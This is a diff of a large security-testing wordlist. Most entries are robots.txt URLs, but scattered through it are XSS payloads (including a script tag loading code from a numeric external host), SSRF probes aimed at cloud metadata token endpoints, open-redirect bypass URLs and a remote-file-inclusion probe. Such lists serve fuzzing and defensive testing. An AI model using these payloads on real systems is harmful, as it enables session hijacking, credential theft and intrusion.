 from : `http://www.thespanner.co.uk/2014/03/21/rpo/`
-frontend/http://avma.org/robots.txt
+frontend/http://cochrane.org/robots.txt
 frontend/http://cryptome.org/robots.txt
 fs\\3
 fs\\7
@@ -14408,6 +14406,7 @@ fxn8t567ni`"uh'\{&-zdv*"\\sztiz$
 fya@l\\6`ya^$3=jfx\{ti;'5zh&?'#&
 fyberspider (+http://www.fybersearch.com/fyberspider.php)
 g/4are9chttp://codepen.io/robots.txt
+g/4are9chttp://flickr.com/robots.txt
 g/4are9chttp://google.nl/robots.txt
 g/4are9chttp://nps.gov/robots.txt
 g5>vey[g\\`pd=tx0j2#ux,th\{t1do+
@@ -14430,7 +14429,6 @@ gaisbot/3.0+(robot05@gais.cs.ccu.edu.tw;+http://gais.cs.ccu.edu.tw/robot.php)
 gaisbot/3.0+(robot06@gais.cs.ccu.edu.tw;+http://gais.cs.ccu.edu.tw/robot.php)
 galaxybot/1.0 (http://www.galaxy.com/galaxybot.html)
 gallent search spider v1.4 robot 2 (http://robot.gallentsearch.com)
-gam-placements-dave/http://rocketlawyer.com/robots.txt
 gam-placements-dave/http://starlink.com/robots.txt
 gamekitbot/1.0 (+http://www.uchoose.de/crawler/gamekitbot/)
 garbo\\32
@@ -14465,8 +14463,8 @@ git.torproject.org: http://dccbbv6cooddgcrq.onion/
 git: https://git-scm.com/
 github: https://github.com/textpattern
 go.php?http:%2f%2fall-silhouettes.com%2fwp-content%2fuploads%2f2011%2f07%2finsect.rar
-go/http://colorado.edu/robots.txt
 go/http://payments.google.com/robots.txt
+go/http://xiaohongshu.com/robots.txt
 goblin/0.9 (http://www.goguides.org/)
 goblin/0.9.x (http://www.goguides.org/goblin-info.html)
 god\\'sdaughter
@@ -14476,7 +14474,7 @@ god\\\'sknight
 goforitbot ( http://www.goforit.com/about/ )
 goldenfeed spider 1.0 (http://www.goldenfeed.com)
 golocal/extranet/http://rt.com/robots.txt
-golocal/extranet/http://threadless.com/robots.txt
+golocal/extranet/http://worldcat.org/robots.txt
 gonzo1[p] +http://www.suchen.de/popups/faq.jsp
 gonzo2[p] +http://www.suchen.de/faq.html
 google chrome/5.0 (linux; android 8.0.0 pixel xl build/mmb29p) applewebkit/537.36 (khtml, like gecko) chrome/41.0.2272.96 mobile safari/537.36 (compatible; googlebot/2.1; +http://www.google.com/bot.html)
@@ -14648,7 +14646,7 @@ have a look at http://web.nexor.co.uk/mak/doc/robots/robots.html
 hbtronix.spider.2 -- http://hbtronix.de/spider.php
 hcvnslw2gs}p5h<xo6-jhn=u7<8mc/\mg*v{x]n%
 health/files/rhpthttp://flaticon.com/robots.txt
-health/files/rhpthttp://flaybos.blogspot.com/robots.txt
+health/files/rhpthttp://indeed.com/robots.txt
 health/files/rhpthttp://tawk.to/robots.txt
 health/files/rhpthttp://wattpad.com/robots.txt
 heinrichdermiragorobot (http://www.miragorobot.com/scripts/deinfo.asp)
@@ -14696,7 +14694,7 @@ holmes/3.12.3 (http://morfeo.centrum.cz/bot)
 holmes/3.12.4 (http://morfeo.centrum.cz/bot)
 holmes/3.xx (onetszukaj/5.0; +http://szukaj.onet.pl)
 holmesbot (http://holmes.ge)
-home-newhttp://fiercepharma.com/robots.txt
+home-newhttp://epo.org/robots.txt
 home-newhttp://hometalk.com/robots.txt
 honda-search/0.7.2 (nutch; http://lucene.apache.org/nutch/bot.html; search@honda-search.com)
 hoowwwer/2.1.3 (debugging run) (+http://cosco.hiit.fi/search/hoowwwer/ | mailto:crawler-info&lt;at
@@ -14732,7 +14730,6 @@ hprisc-\\9
 hpsadm\\6
 hpsadm\\7
 hpsadm\\8
-hr/http://trusona.com/robots.txt
 hr/http://uib.no/robots.txt
 href="/login?return_to=https%3a%2f%2fgithub.com%2fcoffinxp%2fpayloads%2fblob%2fmain%2fenv.txt"
 ht]gj\\id})(t4*?a1x\\rwmpjxrrh](
@@ -14927,8 +14924,8 @@ html/https%3a%2f%2fwww.sheridancollege.ca%2flife-at-sheridan%2fstudent-services%
 html/https%3a%2f%2fwww.teachers.ab.ca%2ffor%2520members%2fprograms%2520and%2520services%2fata%2520library%2fpages%2findex.aspx
 html/https%3a%2f%2fwww.vaughan.ca%2fservices%2fvaughan_archives%2fpages%2fdefault.aspx
 html2jpg blackbox&#44; http://www.html2jpg.com
-htmlmsg/http://docstoc.com/robots.txt
 htmlmsg/http://informit.com/robots.txt
+htmlmsg/http://news.cornell.edu/robots.txt
 http%3a%2f%2f123homesecuritycentral
 http%3a%2f%2f1mlmpro
 http%3a%2f%2facpilot
@@ -15306,87 +15303,92 @@ http://135.23.158.130/.testing/xss_vuln.html%00
 http://135.23.158.130/.testing/xss_vuln.php
 http://135.23.158.130/.testing/xss_vuln.php%00
 http://169.254.169.254.nicelocal.com/
+http://20minutos.es/robots.txt
+http://3.bp.blogspot.com/robots.txt
+http://3aw.com.au/robots.txt
 http://3h6k7liaiqjfnen@www.whitelisteddomain.tld+@localdomain.pw/
 http://3h6k7liaiqjfnen@www.whitelisteddomain.tld@localdomain.pw/
-http://aao.org/robots.txt
-http://abc4.com/robots.txt
-http://aclanthology.org/robots.txt
+http://aardman.com/robots.txt
+http://abercrombie.com/robots.txt
+http://active.com/robots.txt
 http://actualidad.rt.com/actualidad/161955-meridiano-ano-nuevo-rt
 http://adblockplus.org/robots.txt
-http://adbutler.com/robots.txt
+http://aerisweather.com/robots.txt
+http://affiliate-program.amazon.com/robots.txt
+http://agilemanifesto.org/robots.txt
 http://ahmedridho.co.cc/md5hash/
 http://airasia.com/robots.txt
-http://airtable.com/robots.txt
 http://ajc.com/robots.txt
-http://akorda.kz/robots.txt
+http://aka.ms/robots.txt
+http://aldi.com.au/robots.txt
 http://alert(1)@brutelogic.com.br/webgun/test.php?p=<svg+onload=eval(url.slice(7,15))>
-http://alertthemedic.com/robots.txt
-http://aloyoga.com/robots.txt
-http://amazon.cn/robots.txt
+http://aliexpress.ru/robots.txt
+http://aljazeera.com/robots.txt
+http://amazon.co.jp/robots.txt
 http://amazon.co.uk/robots.txt
-http://amnesty.org/robots.txt
+http://amazon.com/robots.txt
+http://amazon.de/robots.txt
+http://amazon.es/robots.txt
+http://amazon.fr/robots.txt
+http://amazon.in/robots.txt
+http://amazon.it/robots.txt
+http://ameblo.jp/robots.txt
+http://android.wordpress.org/robots.txt
+http://angel.com/robots.txt
 http://anita76.biz
 http://anonymouse.org/ (unix)
 http://anothermag.com/robots.txt
-http://answers.yahoo.com/robots.txt
-http://aoc.gov/robots.txt
+http://answerthepublic.com/robots.txt
+http://api.openai.com/robots.txt
 http://apis.google.com/robots.txt
-http://apod.nasa.gov/robots.txt
+http://apple.com/robots.txt
 http://apple.freebiejeebies.co.uk
-http://arbeitsagentur.de/robots.txt
-http://arbys.com/robots.txt
-http://archilovers.com/robots.txt
 http://archive.debian.org/debian-archive
-http://artforum.com/robots.txt
-http://artofmanliness.com/robots.txt
-http://asana.com/robots.txt
 http://asics.com/robots.txt
 http://ask.24x.info/ (http://narres.it/)
-http://aspca.org/robots.txt
 http://assets.ctfassets.net/robots.txt
-http://attack.mitre.org/robots.txt
+http://atlanticcouncil.org/robots.txt
+http://auphonic.com/robots.txt
+http://austinchronicle.com/robots.txt
 http://awlg.org/index.gen
-http://azquotes.com/robots.txt
-http://babel.hathitrust.org/robots.txt
-http://bangor.ac.uk/robots.txt
-http://bard.google.com/robots.txt
+http://babycenter.com/robots.txt
+http://balsamiq.com/robots.txt
 http://bbs.pcaut
 http://beebom.com/robots.txt
+http://behance.net/robots.txt
 http://beian.xinnet.com
-http://beta.lemondeinformatique.fr/http://bemyeyes.com/robots.txt
+http://beta.lemondeinformatique.fr/http://navarra.es/robots.txt
+http://betterup.com/robots.txt
+http://bilibili.com/robots.txt
+http://blinkist.com/robots.txt
 http://blog.adobe.com/robots.txt
-http://blog.google/robots.txt
-http://blog.myfitnesspal.com/robots.txt
-http://blog.sfgate.com/robots.txt
 http://blog.tian
-http://blogs.gartner.com/robots.txt
-http://blossomthemes.com/robots.txt
-http://boxofficemojo.com/robots.txt
-http://broadinstitute.org/robots.txt
-http://broadwayworld.com/robots.txt
+http://blog.trendmicro.com/robots.txt
+http://blogs.cisco.com/robots.txt
+http://blogs.plos.org/robots.txt
+http://blogs.sap.com/robots.txt
+http://bloomingdales.com/robots.txt
+http://bodyland.rs/robots.txt
+http://boozallen.com/robots.txt
+http://bringatrailer.com/robots.txt
 http://brutelogic.com.br/webgun/test.php?p=<brute id=test onmouseover=alert(1)>aaaa
 http://brutelogic.com.br/webgun/test.php?p=<brute onmouseover=pop(1)>aaaa
 http://brutelogic.com.br/webgun/test.php?p=<script src=//3334957647/1>
-http://bundesfinanzministerium.de/robots.txt
-http://business.time.com/robots.txt
-http://business.twitter.com/robots.txt
-http://cacm.acm.org/robots.txt
+http://buenosaires.gob.ar/robots.txt
+http://businessweekly.com.tw/robots.txt
+http://bvdg-online.com/robots.txt
 http://cae.com/robots.txt
 http://camo.githubusercontent.com/robots.txt
-http://canr.msu.edu/robots.txt
-http://cartercenter.org/robots.txt
+http://campaignlive.co.uk/robots.txt
+http://canva.com/robots.txt
+http://careers.google.com/robots.txt
 http://catalog.data.gov/robots.txt
-http://cbsnews.com/robots.txt
-http://ceur-ws.org/robots.txt
+http://centrumstocznia.com/robots.txt
 http://chartjs.org/robots.txt
-http://chrisjdavis.org/robots.txt
 http://chrome.google.com/robots.txt
-http://cinematreasures.org/robots.txt
-http://cira.ca/robots.txt
 http://cirt.net/rfiinc.txt?
 http://citrus-island.com/home
-http://citybeat.com/robots.txt
-http://claimreviewproject.com/robots.txt
+http://cityu.edu.hk/robots.txt
 http://classy.org/robots.txt
 http://clientapi.ipip.net/echo.php?info=20160803023655
 http://clientapi.ipip.net/echo.php?info=20160805060605
@@ -15394,157 +15396,147 @@ http://clientapi.ipip.net/echo.php?info=20160809192413
 http://clientapi.ipip.net/echo.php?info=20161002024712
 http://clientapi.ipip.net/echo.php?info=20161214125948
 http://clientapi.ipip.net/echo.php?info=20170419181401
-http://cntraveller.com/robots.txt
-http://coinpayments.net/robots.txt
+http://cloud.ibm.com/robots.txt
+http://cnil.fr/robots.txt
+http://colab.research.google.com/robots.txt
+http://collegescorecard.ed.gov/robots.txt
 http://commerce.gov/robots.txt
-http://computerhistory.org/robots.txt
+http://community.cloudflare.com/robots.txt
 http://consoles.freebiejeebies.co.uk/128215
-http://controlup.com.br/robots.txt
+http://consumerlab.com/robots.txt
+http://corefiling.com/robots.txt
 http://costco.com.mx/robots.txt
+http://coveteur.com/robots.txt
 http://creativecommons.org/licenses/by/3.0/legalcode
+http://creatoracademy.youtube.com/robots.txt
 http://cryptocompare.com/robots.txt
-http://ct.de/robots.txt
-http://ctatube.com/robots.txt
-http://curl.haxx.se/robots.txt
-http://dailymotion.com/robots.txt
-http://dailystar.co.uk/robots.txt
-http://dailytelegraph.com.au/robots.txt
-http://datatracker.ietf.org/robots.txt
-http://dazeddigital.com/robots.txt
-http://db.com/robots.txt
-http://dbpedia.org/robots.txt
-http://de.wikipedia.org/robots.txt
-http://dell.com/robots.txt
+http://cryptokitties.co/robots.txt
+http://cryptome.org/robots.txt
+http://data.cityofnewyork.us/robots.txt
+http://delawareonline.com/robots.txt
+http://designsponge.com/robots.txt
 http://devel.trisquel.info
-http://developer.chrome.com/robots.txt
-http://developer.nvidia.com/robots.txt
-http://digiturk.com.tr/robots.txt
-http://diigo.com/robots.txt
-http://dnb.com/robots.txt
+http://developer.apple.com/robots.txt
+http://digital.gov/robots.txt
+http://digitalcollections.nypl.org/robots.txt
+http://dmca.com/robots.txt
 http://dni.gov/robots.txt
-http://docs.mapbox.com/robots.txt
 http://docs.woocommerce.com/robots.txt
 http://domain/page.php/"><svg onload=alert(1)>
 http://domain/page?p=%26p=%26lt;svg/onload=alert(1)><j%20onclick=location%2b=document.body.textcontent>click%20me![body_content]&p=<svg/onload=alert(1)>click me!
 http://domain/wp-root/wp-content/plugins/akismet/index.php?brute=cmd
 http://down5.ipark.c
-http://downdetector.com/robots.txt
-http://duluthnewstribune.com/robots.txt
-http://dvcs.w3.org/robots.txt
-http://dwd.de/robots.txt
-http://ebay.com.au/robots.txt
-http://ebay.it/robots.txt
-http://educba.com/robots.txt
-http://edweek.org/robots.txt
-http://eea.europa.eu/robots.txt
-http://ehow.com/robots.txt
+http://dtic.mil/robots.txt
+http://earth.google.com/robots.txt
+http://ecologie.gouv.fr/robots.txt
+http://economist.com/robots.txt
 http://elyashiv.fav.co.il/images/lock.png
-http://embrapa.br/robots.txt
-http://emory.edu/robots.txt
-http://en-gb.facebook.com/robots.txt
+http://emag.ro/robots.txt
 http://en.m.wikipedia.org/robots.txt
-http://es.wordpress.org/robots.txt
-http://espn.com/robots.txt
-http://eur.nl/robots.txt
-http://europepmc.org/robots.txt
-http://examiner.com/robots.txt
+http://essex.ac.uk/robots.txt
+http://ethereum.org/robots.txt
 http://example.com
-http://ey.com/robots.txt
+http://expressvpn.com/robots.txt
 http://facebook.com/c.kecil.fasy
-http://fas.org/robots.txt
+http://faktykaliskie.pl/robots.txt
+http://farm3.staticflickr.com/robots.txt
+http://fbi.gov/robots.txt
 http://feeds.feedburner.com/1stwebdesigner
 http://fema.gov/robots.txt
-http://flaybos.blogspot.com/robots.txt
+http://firebasestorage.googleapis.com/robots.txt
+http://first.org/robots.txt
+http://fiserv.com/robots.txt
 http://flipsnack.com/robots.txt
 http://flirtbg.info
-http://fnac.com/robots.txt
-http://fosdem.org/robots.txt
+http://fortawesome.github.io/robots.txt
+http://fortinet.com/robots.txt
+http://foundation.app/robots.txt
+http://fragazuzu.blogspot.com/robots.txt
+http://frc.org/robots.txt
 http://freeworld.thc.org/thc-hydra/
 http://frontline-games.com/forum/index.aspx
 http://frontline-games.com/forum/index.php
 http://ftp.ssec.wisc.edu
-http://gapminder.org/robots.txt
-http://gartner.com/robots.txt
-http://gatesnotes.com/robots.txt
-http://geekwire.com/robots.txt
-http://geetha.mil.gr/robots.txt
-http://geocities.com/robots.txt
-http://getbootstrap.com/robots.txt
-http://getpaint.net/robots.txt
+http://fubo.tv/robots.txt
+http://fullcontact.com/robots.txt
+http://gallica.bnf.fr/robots.txt
+http://gameloft.com/robots.txt
+http://gettyimages.com/robots.txt
+http://giantbomb.com/robots.txt
 http://gifts.freebiejeebies.co.uk
 http://gimletmedia.com/robots.txt
-http://gimp.org/robots.txt
-http://gnupg.org/robots.txt
+http://gist.github.com/robots.txt
+http://google-melange.com/robots.txt
 http://google.co.nz/robots.txt
 http://google.com
 http://google.com&www.whitelisteddomain.tld
+http://google.com.ni/robots.txt
 http://google.com:80#@www.whitelisteddomain.tld/
 http://google.com:80?@www.whitelisteddomain.tld/
 http://google.com\www.whitelisteddomain.tld
-http://google.cz/robots.txt
-http://google.es/robots.txt
 http://google.it/robots.txt
-http://googleads.g.doubleclick.net/robots.txt
-http://gov.texas.gov/robots.txt
+http://gosquared.com/robots.txt
 http://government.nl/robots.txt
-http://gravityforms.com/robots.txt
-http://grizzluss.blogspot.com/robots.txt
+http://gravatar.com/robots.txt
+http://groupon.com/robots.txt
 http://habrahabr.ru/blogs/wind
-http://hackernoon.com/robots.txt
+http://hackage.haskell.org/robots.txt
+http://hackbrightacademy.com/robots.txt
 http://hackmytrip.com/2013/05/free-wifi-on-delta-through-june-30-for-blackberry-users/
-http://happycow.net/robots.txt
+http://hanselman.com/robots.txt
+http://harman.com/robots.txt
 http://hashchecker.de/
-http://hbomax.com/robots.txt
-http://headspace.com/robots.txt
+http://haveibeenpwned.com/robots.txt
+http://health.nsw.gov.au/robots.txt
+http://healthtips1dr.blogspot.com/robots.txt
 http://help.ipark.cn
-http://help.salesforce.com/robots.txt
-http://helpnetsecurity.com/robots.txt
 http://heylink.me/robots.txt
 http://hilfe.acont.de/bot.html acontbot
-http://hodinkee.com/robots.txt
-http://hopkinsmedicine.org/robots.txt
-http://hopper.com/robots.txt
-http://hover.com/robots.txt
-http://htmlpreview.github.io/robots.txt
-http://hubpages.com/robots.txt
-http://huffpost.com/robots.txt
+http://hindawi.com/robots.txt
 http://huggingface.co/robots.txt
-http://humanorigins.si.edu/robots.txt
-http://ibb.co/robots.txt
+http://iab.com/robots.txt
+http://ibtimes.co.uk/robots.txt
 http://id.tianya
-http://ideas.ted.com/robots.txt
-http://ideo.com/robots.txt
-http://ig.com/robots.txt
-http://ilovefreesoftware.com/robots.txt
+http://igi-global.com/robots.txt
+http://ikea.com/robots.txt
+http://impots.gouv.fr/robots.txt
+http://imsglobal.org/robots.txt
 http://in.archive.trisquel.info/trisquel/
-http://indiegogo.com/robots.txt
-http://inklestudios.com/robots.txt
-http://instagram.com/robots.txt
-http://intel.com/robots.txt
+http://infolab.stanford.edu/robots.txt
+http://informationweek.com/robots.txt
+http://insidethemagic.net/robots.txt
 http://internalhost.eu
-http://invisionapp.com/robots.txt
-http://irna.ir/robots.txt
-http://irs.gov/robots.txt
-http://iso.org/robots.txt
-http://it.linkedin.com/robots.txt
-http://iupac.org/robots.txt
-http://iwalkcornwall.co.uk/robots.txt
-http://iwaponline.com/robots.txt
+http://iol.co.za/robots.txt
+http://irishtimes.com/robots.txt
+http://issues.chromium.org/robots.txt
+http://it.pinterest.com/robots.txt
+http://itworld.com/robots.txt
+http://ja.wikipedia.org/robots.txt
+http://jamesclear.com/robots.txt
+http://japantimes.co.jp/robots.txt
 http://javascript:alert(1)@brutelogic.com.br/webgun/test.php?p=<svg+onload=location=url.slice(7,26)>
-http://jetpack.me/robots.txt
+http://jeancoutu.com/robots.txt
+http://jetbrains.com/robots.txt
 http://journaldunet.com/robots.txt
+http://journals.physiology.org/robots.txt
 http://jsfiddle.net/xboz/c7vvkedv/
-http://karpathy.github.io/robots.txt
-http://kstp.com/robots.txt
-http://lavozdegalicia.es/robots.txt
+http://judicialwatch.org/robots.txt
+http://justonecookbook.com/robots.txt
+http://kesq.com/robots.txt
+http://kickstarter.com/robots.txt
+http://kinsta.com/robots.txt
 http://lbcgroup.tv/robots.txt
-http://leagueoflegends.com/robots.txt
-http://lehigh.edu/robots.txt
+http://learning.linkedin.com/robots.txt
+http://lenta.ru/robots.txt
+http://lesechos.fr/robots.txt
+http://lewrockwell.com/robots.txt
+http://linkinghub.elsevier.com/robots.txt
 http://linkr.bio/robots.txt
-http://lit.link/robots.txt
+http://lionsroar.com/robots.txt
+http://liveinternet.ru/robots.txt
 http://liverpool.ac.uk/robots.txt
-http://llvm.org/robots.txt
-http://ln.hixie.ch/robots.txt
+http://livescience.com/robots.txt
+http://lmgtfy.com/robots.txt
 http://localdomain.pw%23.www.whitelisteddomain.tld/
 http://localdomain.pw%2f%2f.www.whitelisteddomain.tld/
 http://localdomain.pw%3f.www.whitelisteddomain.tld/
@@ -15552,39 +15544,37 @@ http://localdomain.pw%5c%5c.www.whitelisteddomain.tld/
 http://localdomain.pw:80#@www.whitelisteddomain.tld/
 http://localdomain.pw:80?@www.whitelisteddomain.tld/
 http://localdomain.pw\twww.whitelisteddomain.tld/
-http://lockheedmartin.com/robots.txt
-http://lsu.edu/robots.txt
 http://lumalabs.ai/robots.txt
-http://m.weibo.cn/robots.txt
-http://madfishdigital.com/robots.txt
+http://lumendatabase.org/robots.txt
 http://mail.com
-http://maps.google.de/robots.txt
-http://math.uwaterloo.ca/robots.txt
-http://mcusercontent.com/robots.txt
+http://mailerlite.com/robots.txt
+http://mamamia.com.au/robots.txt
+http://mariokart64.com/robots.txt
+http://market.android.com/robots.txt
+http://mars.com/robots.txt
 http://md5.igrkio.info/md5-hash-database.html
 http://md5decrypter.co.uk/
-http://mdpi.com/robots.txt
 http://mecagoento.com
+http://media.defense.gov/robots.txt
 http://medicalxpress.com/robots.txt
+http://melon.com/robots.txt
 http://members.000webhost.com/edit_your_details.php?login_hash=k4fuwetywmwk0nzo
 http://members.lycos.co.uk/shi
-http://menafn.com/robots.txt
-http://messenger.com/robots.txt
 http://meta.7search.com/click/click.aspx?x=qz3w%2b7lxy5%2bf4yge%2fexxaq%3d%3d_8kvaab7wrm%2byumfrq93gho0o7hkjviqzcu9ip1eprhh9e7a5pxxfvn1t5h3j04kudlu0cydgdpatiphprbhj1mvksej2szwvnzc7hkkpltov0rhfrkjhxec9wrghybzyjcdf26jtihd5buzd7o8fv4ph8yos6xri0g0xfnf8ribbh5tczrygd4fd2flbgr3%2bqfw89fz%2f0wthw33uimwm%2bbrkh%2bxbaagez%2bjxgk7sig5lj2bzd5phaimdaosulgpe
 http://metadata.google.internal/computeMetadata/v1/
 http://metadata.google.internal/computeMetadata/v1/instance/attributes/
 http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
 http://mfa.org/robots.txt
+http://mi.com/robots.txt
+http://midjourney.com/robots.txt
+http://mindtools.com/robots.txt
 http://mirrors.knoesis.org/trisquel/packages
 http://mirrors.serverhost.ro/trisquel/packages
-http://mixpanel.com/robots.txt
+http://moe.gov.sg/robots.txt
 http://mogral.in/mogralbot/1.0 (iphone)
-http://mondaq.com/robots.txt
-http://montblanc.com/robots.txt
-http://mouseflow.com/robots.txt
-http://msha.ke/robots.txt
-http://mural.co/robots.txt
-http://myheritage.com/robots.txt
+http://msdn2.microsoft.com/robots.txt
+http://munichre.com/robots.txt
+http://mustache.github.io/robots.txt
 http://myip.ms/view/comp_browseragents/1087299/mozilla_5_0_windows_nt_6_1_wow64_applewebkit_537_36_khtml_like_gecko_chrome_36_0_1985_125_safari_537_36.html
 http://myip.ms/view/comp_browseragents/12354/mozilla_5_0_compatible_msie_10_0_windows_nt_6_2_wow64_trident_6_0.html
 http://myip.ms/view/comp_browseragents/192054/mozilla_5_0_windows_nt_5_1_applewebkit_537_1_khtml_like_gecko_chrome_21_0_1180_89_safari_537_1.html
@@ -15594,85 +15584,99 @@ http://myip.ms/view/comp_browseragents/47021/mozilla_5_0_windows_nt_5_1_rv_12_0_
 http://myip.ms/view/comp_browseragents/5984/mozilla_4_0_compatible_msie_7_0_windows_nt_6_1_wow64_trident_5_0_slcc2_net_clr_2_0_50727_net_clr_3_5_30729_net_clr_3_0_30729_media_center_pc_6_0_net4_0c_net4_0e.html
 http://myip.ms/view/comp_browseragents/795675/opera_9_80_windows_nt_6_2_win64_x64_presto_2_12_version_12_16.html
 http://myip.ms/view/comp_browseragents/969396/mozilla_5_0_windows_nt_6_1_wow64_rv_31_0_gecko_20100101_firefox_31_0.html
-http://n-sign.jp/robots.txt
-http://nbcuni.com/robots.txt
-http://newamerica.org/robots.txt
-http://newrelic.com/robots.txt
-http://news.cnet.com/robots.txt
-http://news.nationalpost.com/robots.txt
+http://nccih.nih.gov/robots.txt
+http://neatorama.com/robots.txt
+http://neilrogers.org/robots.txt
+http://nerdwallet.com/robots.txt
+http://news-medical.net/robots.txt
+http://news.err.ee/robots.txt
 http://news.sina.com.cn/
-http://newsroom.mastercard.com/robots.txt
-http://nhk.jp/robots.txt
-http://nidirect.gov.uk/robots.txt
-http://nielsen.com/robots.txt
+http://news.stanford.edu/robots.txt
+http://news.xbox.com/robots.txt
+http://newsweek.com/robots.txt
+http://newyorkfed.org/robots.txt
+http://newyorkyimby.com/robots.txt
+http://niemanlab.org/robots.txt
 http://nikitamarchant.be/enigma/
 http://ninaknowsbest.com/blog
-http://ninds.nih.gov/robots.txt
-http://norges-bank.no/robots.txt
-http://nownews.com/robots.txt
+http://nlp.stanford.edu/robots.txt
+http://nodejs.org/robots.txt
+http://nominet.uk/robots.txt
+http://northtexasplasticsurgery.com/robots.txt
 http://npr.org/robots.txt
-http://nrf.com/robots.txt
-http://numpy.org/robots.txt
+http://nrdc.org/robots.txt
+http://nuget.org/robots.txt
 http://nyash.net
-http://online.liebertpub.com/robots.txt
-http://online.wsj.com/robots.txt
-http://onlyinyourstate.com/robots.txt
-http://openknowledge.worldbank.org/robots.txt
+http://nyp.org/robots.txt
+http://nypl.org/robots.txt
+http://ocf.berkeley.edu/robots.txt
+http://oi.com.br/robots.txt
+http://ok.ru/robots.txt
+http://onstar.com/robots.txt
 http://opera.com/robots.txt
-http://orkut.com/robots.txt
-http://osmand.net/robots.txt
+http://opusangelorum.at/robots.txt
 http://ouraring.com/robots.txt
-http://outschool.com/robots.txt
+http://overdrive.com/robots.txt
+http://owncloud.org/robots.txt
+http://oyc.yale.edu/robots.txt
 http://ozysoftware.com/index.html
 http://packetstormsecurity.org/crackers/wordlists/
-http://pantheon.io/robots.txt
-http://parler.com/robots.txt
-http://parliament.uk/robots.txt
-http://pasteboard.co/robots.txt
+http://pages.stern.nyu.edu/robots.txt
+http://papers.nips.cc/robots.txt
+http://parents.com/robots.txt
+http://patch.com/robots.txt
+http://patents.google.com/robots.txt
 http://patupala.org
+http://payscale.com/robots.txt
 http://pbwiki.com/content/jobs
 http://pcexpert.forumfree.net
 http://pennysonlineshop.com/
-http://people.mozilla.org/robots.txt
-http://perplexity.ai/robots.txt
-http://philstar.com/robots.txt
-http://pinboard.in/robots.txt
-http://pinterest.ca/robots.txt
-http://pix11.com/robots.txt
-http://pixlr.com/robots.txt
-http://polestar.com/robots.txt
+http://pewresearch.org/robots.txt
+http://phpbb.com/robots.txt
+http://pixabay.com/robots.txt
+http://plus.google.com/robots.txt
+http://podcastaddict.com/robots.txt
+http://podcastindex.org/robots.txt
+http://podcasts.apple.com/robots.txt
+http://practicalecommerce.com/robots.txt
 http://praxe.monkeymedals.com/
-http://prepostseo.com/robots.txt
-http://press.princeton.edu/robots.txt
-http://prntscr.com/robots.txt
 http://programmableweb.com/robots.txt
-http://pscp.tv/robots.txt
+http://psychcentral.com/robots.txt
+http://pt.wikipedia.org/robots.txt
+http://ptc.com/robots.txt
 http://public.fotki.com/paliune/
-http://pubs.usgs.gov/robots.txt
+http://pubs.acs.org/robots.txt
+http://pubs.rsc.org/robots.txt
+http://pubs.rsna.org/robots.txt
 http://qnap.com/robots.txt
-http://qr.ae/robots.txt
+http://qxmd.com/robots.txt
 http://racinguistasonline.com/in
+http://ravelry.com/robots.txt
 http://rawpixel.com/robots.txt
-http://redbubble.com/robots.txt
-http://research.youtube/robots.txt
-http://ripple.com/robots.txt
+http://referralcandy.com/robots.txt
+http://resellerbazzar.in/robots.txt
+http://ris.bka.gv.at/robots.txt
+http://river.com/robots.txt
 http://ro.netlog.com/ioanamya
-http://rochester.edu/robots.txt
-http://russianspaceweb.com/robots.txt
-http://s3.ap-southeast-1.amazonaws.com/robots.txt
-http://santoshdigital.com/robots.txt
-http://sciencemag.org/robots.txt
-http://screencast.com/robots.txt
-http://search.creativecommons.org/robots.txt
-http://sebrae.com.br/robots.txt
-http://sephora.com/robots.txt
-http://sfchronicle.com/robots.txt
-http://shopee.sg/robots.txt
-http://shoutfactory.com/robots.txt
-http://shutterstock.com/robots.txt
-http://skipthedishes.com/robots.txt
-http://skysports.com/robots.txt
+http://roblox.com/robots.txt
+http://rockwellautomation.com/robots.txt
+http://rollingstone.com/robots.txt
+http://scientology.org/robots.txt
+http://scripts.sil.org/robots.txt
+http://sdge.com/robots.txt
+http://securepubads.g.doubleclick.net/robots.txt
+http://seekingalpha.com/robots.txt
+http://semafor.com/robots.txt
+http://sendgrid.com/robots.txt
+http://servicesdirectory.withyoutube.com/robots.txt
+http://sfgate.com/robots.txt
+http://shrm.org/robots.txt
+http://simple.wikipedia.org/robots.txt
+http://simplebits.com/robots.txt
+http://simplemaps.com/robots.txt
+http://sky.com/robots.txt
 http://sloanreview.mit.edu/robots.txt
+http://smithsonianmag.com/robots.txt
 http://sn1persecurity.com
 http://sn1persecurity.com/.testing/iframe_injection.php
 http://sn1persecurity.com/.testing/redirect_vuln.txt
@@ -15687,91 +15691,93 @@ http://sn1persecurity.com/.testing/xss_vuln.html
 http://sn1persecurity.com/.testing/xss_vuln.html%00
 http://sn1persecurity.com/.testing/xss_vuln.php
 http://sn1persecurity.com/.testing/xss_vuln.php%00
-http://snpartners.com/robots.txt
-http://sos.ca.gov/robots.txt
-http://sourceforge.net/robots.txt
-http://spanglaw.com/robots.txt
-http://speakerdeck.com/robots.txt
-http://spectrumlocalnews.com/robots.txt
+http://snag.gy/robots.txt
 http://spoofed.169.254.169.254.xip.io/
-http://squareup.com/robots.txt
-http://ssense.com/robots.txt
-http://stopandshop.com/robots.txt
+http://ssb.no/robots.txt
+http://standard.co.uk/robots.txt
+http://static-content.springer.com/robots.txt
+http://static.wixstatic.com/robots.txt
+http://static1.squarespace.com/robots.txt
+http://stellar.org/robots.txt
 http://storage.googleapis.com/robots.txt
-http://store.steampowered.com/robots.txt
 http://stormhotel.zapto.org/mana
-http://storytel.com/robots.txt
-http://supercell.com/robots.txt
+http://subversion.apache.org/robots.txt
 http://support.mozilla.org/robots.txt
-http://support.skype.com/robots.txt
-http://swpc.noaa.gov/robots.txt
-http://sxsw.com/robots.txt
+http://sworkit.com/robots.txt
+http://sydney.edu.au/robots.txt
+http://t.me/robots.txt
 http://talkspace.com/robots.txt
+http://target.com/robots.txt
 http://target.com/something.jsp?inject=<script>eval(location.hash.slice(1))</script>#alert(1)
 http://target.com/something.xxx?a=val1&a=val2
-http://tate.org.uk/robots.txt
+http://tatacliq.com/robots.txt
 http://team-deicide.net84.net/
-http://techopedia.com/robots.txt
+http://teamspeak.com/robots.txt
+http://tech.co/robots.txt
+http://techradar.com/robots.txt
 http://teknikpergaulan.blogspo
-http://telerik.com/robots.txt
 http://theargon.com/achilles/wordlists/
-http://theatlanticwire.com/robots.txt
+http://theblog.adobe.com/robots.txt
 http://thecanadianencyclopedia.ca/robots.txt
 http://thecut.com/robots.txt
 http://thedutchdealer.com/admini
+http://thelancet.com/robots.txt
+http://themeforest.net/robots.txt
 http://thetimes.co.uk/robots.txt
+http://thetrevorproject.org/robots.txt
+http://thewire.in/robots.txt
